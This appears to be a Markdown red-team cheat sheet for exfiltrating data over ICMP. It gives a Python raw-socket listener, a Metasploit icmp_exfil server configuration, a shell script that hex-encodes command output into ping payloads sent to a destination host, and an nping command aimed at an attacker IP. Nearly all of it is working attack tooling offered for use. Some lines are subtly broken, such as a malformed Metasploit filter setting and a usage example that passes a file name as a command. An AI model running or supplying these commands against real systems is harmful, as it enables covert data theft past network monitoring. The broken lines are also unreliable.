# ICMP

## 01 - Server Setup

### 1.1 - Python Script Server

`$ cat icmp_server.py`

---

```python
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
while True:
    data, src = s.recvfrom(1600)
    payload = data[44:60]
    sys.stdout.write(payload)
```

### 1.2 - Metasploit

```
msf > use auxiliary/server/icmp_exfil

msf auxiliary(server/icmp_exfil) > options

Module options (auxiliary/server/icmp_exfil):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   BPF_FILTER       icmp             yes       BFP format filter to listen for
   END_TRIGGER      ^EOF             yes       Trigger for end of file
   FNAME_IN_PACKET  true             yes       Filename presented in first packet straight after START_TRIGGER
   INTERFACE                         no        The name of the interface
   RESP_CONT        OK               yes       Data ro resond when continuation of data expected
   RESP_END         COMPLETE         yes       Data to response when EOF received and data saved
   RESP_START       SEND             yes       Data to respond when initial trigger matches
   START_TRIGGER    ^BOF             yes       Trigger for beginning of file


View the full module info with the info, or info -d command.

msf auxiliary(server/icmp_exfil) > set interface <interface>

msf auxiliary(server/icmp_exfil) > set icmp and not src <target_IP>

msf auxiliary(server/icmp_exfil) > run -j
```

## 02 - Usage

### 2.1 - Unix Shell

`$ cat icmp.sh`

```sh
#!/bin/sh

echo "${@:2}"

if [[ -z "$1" ]] || [[ -z "$2" ]];
then
    echo "Usage: $0 <destination> <command>"
    exit 1
fi

DEST=$1
CMD=${@:2}
OUTPUT=$($CMD | xxd -p -c 16)

ORG=$IFS
IFS=$(echo -en "\n\b")

for ROW in ${OUTPUT[@]}
do
    if [[ ${#ROW} = 32 ]]; then
        PAYLOAD=$ROW
    else
        PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
        PAYLOAD=$ROW$PAD
    fi
    ping -c 1 -p $PAYLOAD $DEST
done
```

```
$ chmod +x icmp.sh

$ ./icmp.sh <IP> file.txt
```

### 2.2 - Nping

`$ nping --icmp <attacker_IP> --data-string "file.txt" -c 1`

## References

- [Can You Hack It - Quick Tips - Data Exfil Over ICMP](https://www.youtube.com/watch?v=IQwl3ZE0rK0)

- [ICMPExfil](https://github.com/martinoj2009/ICMPExfil)